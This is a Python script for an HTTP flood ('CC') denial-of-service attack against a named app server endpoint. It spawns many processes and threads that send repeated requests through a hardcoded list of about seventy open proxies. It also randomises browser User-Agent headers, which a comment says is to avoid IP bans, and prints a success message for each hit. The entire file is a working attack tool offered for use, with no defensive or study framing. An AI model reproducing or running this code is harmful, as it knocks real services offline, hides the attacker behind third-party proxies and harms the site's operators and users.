import sys
import os

PACKAGE_PARENT = '..'
SCRIPT_DIR = os.path.dirname(os.path.realpath(os.path.join(os.getcwd(), os.path.expanduser(__file__))))
sys.path.append(os.path.normpath(os.path.join(SCRIPT_DIR, PACKAGE_PARENT)))
sys.path.append('C:\ProxyPool\WebApi')
from apis import get_proxy
from fakeUA import FakeChromeUA

from multiprocessing import Pool as ProcessPool
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Process
import requests
import random
import redis


class AttackTT:
    def __init__(self):
        self.url = 'http://user.app.whmrexpo.com/peipeiuser/user/levelexplain'
        # self.url = 'http://127.0.0.1:24422'
        self.jobs = 100
        self.processnum = 10
        self.threadnum = 4
        self.method = 'get'
        self.post = None
        self.proxies_list = ['39.108.56.6:3128', '124.238.235.135:8000', '183.179.199.225:8080', '39.134.68.23:80', '120.52.73.1:96', '103.27.24.114:80', '124.207.178.174:9090', '171.217.92.33:9090', '123.57.76.102:80', '118.144.149.206:3128', '39.137.77.68:80', '119.28.50.37:82', '39.137.69.9:80', '171.10.31.74:8080', '60.205.205.48:80', '171.10.31.73:80', '120.92.88.202:10000', '140.205.222.3:80', '101.4.136.34:8080', '123.161.16.48:9797', '183.2.212.2:3128', '166.111.80.162:3128', '114.228.73.32:6666', '54.222.177.145:3128', '171.10.31.73:8080', '119.39.48.205:9090', '39.137.69.7:80', '103.242.219.242:8080', '39.137.69.8:80', '171.10.31.74:80', '119.27.177.169:80', '103.235.245.35:8080', '121.8.98.196:80', '124.133.230.254:80', '218.59.139.238:80', '39.137.69.10:80', '61.136.163.244:8103', '202.100.83.139:80', '118.212.137.135:31288', '111.62.243.64:8080', '113.200.56.13:8010', '59.44.16.6:8000', '121.8.98.198:80', '101.96.11.4:80', '58.247.46.123:8088', '218.241.234.48:8080', '101.96.10.4:80', '117.127.0.205:8080', '120.79.133.212:8088', '218.93.207.26:8088', '101.4.136.34:80', '117.127.0.204:8080', '114.250.29.45:9090', '123.232.119.125:80', '39.137.69.7:8080', '39.134.14.66:8080', '125.46.69.18:3128', '211.21.120.163:8080', '118.26.164.5:80', '221.7.255.168:80', '59.44.16.6:80', '202.38.92.100:3128', '112.73.6.40:3128', '120.52.73.1:8095', '223.85.196.75:9999', '111.62.243.64:80', '183.56.177.130:808', '42.123.127.1:3128', '39.137.77.66:80', '101.248.64.66:8080', '119.28.152.208:80']


    def cc_website(self, jobs):
        # theader = {}
        #生成http头部，防止封杀IP
        headers = uti.make_headers()
        tmp_proxy = random.choice(self.proxies_list)
        # tmp_proxy['http'] = 'http://{}'.format('')
        # tmp_proxy['https'] = 'https://{}'.format('')
        data_post = {}
        if self.method.upper == 'POST':
            data_post = uti.make_data(self.post)
        while jobs > 0:
        #生成随机参数，防止缓存
            # tmp_url = random_parameters(url)
            if self.method.upper() == 'POST':
                try:
                    response = requests.post(self.url, headers= headers, proxies = {'http':'http://{}'.format(tmp_proxy)} ,data = data_post ,timeout = 10)
                    if response.status_code == 200:
                        print ('Attack website {} success with proxy {}'.format(self.url, tmp_proxy))
                        # print ('Use proxy %s success' % (proxy.strip()))
                except Exception as e:
                    print('Attack failed with error:{}'.format(e.args))
            elif self.method.upper() == 'GET':
                try:
                    response = requests.get(self.url, headers= headers, proxies = {'http':'http://{}'.format(tmp_proxy)} ,timeout = 20)
                    if response.status_code == 200:
                        print('Attack website {} success with proxy {}'.format(self.url, tmp_proxy))
                        # print ('Use proxy %s success' % (proxy.strip()))
                except Exception as e:
                    print('Attack failed with error:{}'.format(e.args))
            jobs -= 1

    '''
    cc主函数-新建测试线程
    '''
    def mk_threading(self, jobs, threadnum):

        threadsPool = ThreadPool(threadnum)
        try:
            result = threadsPool.map(self.cc_website, [100]*jobs) #关键操作
            threadsPool.close()
            threadsPool.join()
        except Exception as e:
            print(e)

    '''
    cc主函数-新建测试进程
    '''
    def mk_process(self,jobs, processnum, threadnum):
        Processpools = ProcessPool(processnum)
        for i in range(processnum):
            Processpools.apply_async(self.mk_threading, args=(jobs, threadnum))
        print ('CC start...')
        print ('Waiting for all subprocesses done...')
        Processpools.close()
        Processpools.join()
        print ('All subprocesses done.')

    '''
    cc主函数
    '''
    def attack_cc(self):
        jobs = 1000
        processnum = 10
        threadnum = 4
        self.mk_process(jobs, processnum, threadnum)

class Utils:
    def __init__(self):
        self.UserAgent = [
                        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
                        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)',
                        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
                        'Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1',
                        'Mozilla/5.0 (Windows; U; Windows NT 5.1) Gecko/20070803 Firefox/1.5.0.12',
                        'Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en) Opera 8.0',
                        'Opera/8.0 (Macintosh; PPC Mac OS X; U; en)',
                        'Opera/9.27 (Windows NT 5.2; U; zh-cn)',
                        'Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
                        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6',
                        'Mozilla/5.0 (iPhone; U; CPU like Mac OS X) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3',
                        'Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13'
                        ]

    def make_headers(self):
        headers = {'Host': 'user.app.whmrexpo.com',
                   'Connection': 'keep-alive',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                   'Accept-Encoding': 'gzip, deflate',
                   'Accept-Language': 'zh-CN,en-US;q=0.8',
                   'X-Requested-With': 'com.heiniu.game',
                   'User-Agent':random.choice(self.UserAgent)
                   }

        return headers

    def make_data(self, data):
        return

if __name__ == '__main__':
    atc = AttackTT()
    uti = Utils()
    fc = FakeChromeUA()
    atc.attack_cc()
else:
    atc = AttackTT()
    uti = Utils()
    fc = FakeChromeUA()